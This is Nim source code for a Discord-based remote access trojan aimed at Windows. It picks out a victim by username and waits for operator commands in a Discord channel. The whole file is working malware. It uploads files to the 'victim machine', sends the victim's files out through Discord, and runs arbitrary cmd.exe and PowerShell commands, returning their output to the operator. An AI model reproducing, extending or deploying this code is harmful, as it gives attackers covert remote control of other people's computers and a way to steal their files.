#basic bot
#created by asimp

#[
    compile : nim c -r -d:dimscordDebug -d:ssl bot.nim
]#

#imports
import dimscord, asyncdispatch, options, os, strutils, ws
import winim/lean
import winim/inc/lm
import httpclient
import system
import streams
import osproc

#client side
let
    discord = newDiscordClient("YOUR AUTH TOKEN")
    channelIdNumber = "YOUR CHAT ID"

#help menu
const helpMenu = """
**[+] Getting Started:**
- `help` -show this menu 
- `hello` -ping target
- `select <target username>` - select target ['all' by default]  

**[+] General:**
- `upload <attachment>` -upload files to victim machine
- `download <path>` -download files to server

**[+] System:**
- `$<command>` -execute command
"""

#get target targetUnamename
var
    targetUname = newString(UNLEN + 1)    
    cb = DWORD targetUname.len

GetUsernameA(&targetUname, &cb)
targetUname.setLen(cb - 1)
var selectedTarget = targetUname


#handler fo on ready
proc onReady(s: Shard, r: Ready) {.event(discord).} = echo "Ready as " & targetUname

#handler for message events
proc messageCreate(s: Shard, m: Message) {.event(discord).} =

    #grab content
    let content = m.content

    #prevent bot from responding to itself
    if (m.author.bot): return

    #check if specific channel 
    if (m.channel_id == channelIdNumber):
        
        #hello
        if (content == "hello"):
            discard await discord.api.sendMessage(m.channel_id, " Hello from **" & targetUname & "**")


        #target selection
        if (content.startsWith("select")):

            var
                messageContent = split(content, " ")
            try:
                selectedTarget = messageContent[1]

                #select all
                if (selectedTarget == "all"):
                    selectedTarget = targetUname


                #select target
                if (selectedTarget == targetUname):
                    discard await discord.api.sendMessage(m.channel_id, "Selected Target : **" & selectedTarget & "**")

            except:
                discard await discord.api.sendMessage(m.channel_id, "No Target Selected, Sorry")
    
    #if bot is running on specified target
    if (selectedTarget == targetUname):
        
        #help menu
        if (content == "help"):
            discard await discord.api.sendMessage(m.channel_id, helpMenu)

        if (content == "upload"):
            discard await discord.api.sendMessage(m.channel_id, "Uploading...")

            #itterate through attachments
            for attachementIndex, attachmentValue in m.attachments:
                var
                    #get attached data
                    filename = attachmentValue.filename
                    url = attachmentValue.url

                    #http download
                    client = newHttpClient()
                    response = client.get(url)
                    f = newFileStream(filename, fmWrite)

                #write to file
                f.write(response.body)
                f.flush
            discard await discord.api.sendMessage(m.channel_id, "Uploaded to: **" & targetUname & "**")

    #download files
    if (content.startsWith("download")):
        discard await discord.api. sendMessage(m.channel_id, "downloading...")
        
        #attemt to download file
        var paths = split(content, " ")
        var count: int
        count = -1
        paths.delete(0)
        
        for p in paths:
            count = count + 1
            try:
                var path = paths[count]
                discard await discord.api.sendMessage(m.channel_id, "Downloaded From **" & targetUname & "**", files = @[DiscordFile(name: path)])

            #exeption
            except:
                discard await discord.api.sendMessage(m.channel_id, "File not Founnd!")
    #run commands in cmd
    if (content.startsWith("$")):

        var
            #get command
            command = content[1 .. content.high]
            #run command on system
        discard await discord.api.sendMessage(m.channel_id, "Sending Command... ")
        try:
            var
                commandOutput = execProcess("cmd.exe /c " & command)
            discard await discord.api.sendMessage(m.channel_id, "Command Succesfully sent! Here is the output: ```**" & commandOutput & "**```")
        except:
            discard await discord.api.sendMessage(m.channel_id, "Command Failed!")

    #run commands in powershell
    if (content.startsWith(".")):

        var
            #get command
            command = content[1 .. content.high]
            #run command on system
        discard await discord.api.sendMessage(m.channel_id, "Sending Command... ")
        try:
            var
                commandOutput = execProcess("Powershell.exe -c " & command)
            discard await discord.api.sendMessage(m.channel_id, "Command Succesfully sent! Here is the output: ```**" & commandOutput & "**```")
        except:
            discard await discord.api.sendMessage(m.channel_id, "Command Failed!")
waitFor discord.startSession()
